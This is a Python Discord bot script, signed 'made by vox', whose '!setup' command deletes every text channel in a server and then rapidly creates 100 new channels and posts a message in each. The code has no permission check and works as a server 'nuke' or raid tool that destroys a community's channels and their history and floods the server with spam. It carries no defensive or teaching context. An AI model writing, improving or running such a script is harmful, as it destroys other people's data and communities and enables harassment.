import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    print("made by vox")

@bot.command()
async def setup(ctx):
    # Delete all text channels
    await delete_all_text_channels(ctx.guild)

    # Create 100 channels and send 50 messages simultaneously
    tasks = []
    for i in range(100):
        channel_name = f'channel-{i+1}'
        tasks.append(create_channel_and_message(ctx, channel_name, 'Your custom message here'))

        # Limit the number of simultaneous tasks to 50
        if len(tasks) >= 50:
            await asyncio.gather(*tasks)
            tasks = []

    # Ensure any remaining tasks are completed
    if tasks:
        await asyncio.gather(*tasks)

async def delete_all_text_channels(guild):
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.delete()

async def create_channel_and_message(ctx, channel_name, message):
    channel = await ctx.guild.create_text_channel(channel_name)
    await channel.send(message)

bot.run('YOUR-DC-TOKEN-HERE')
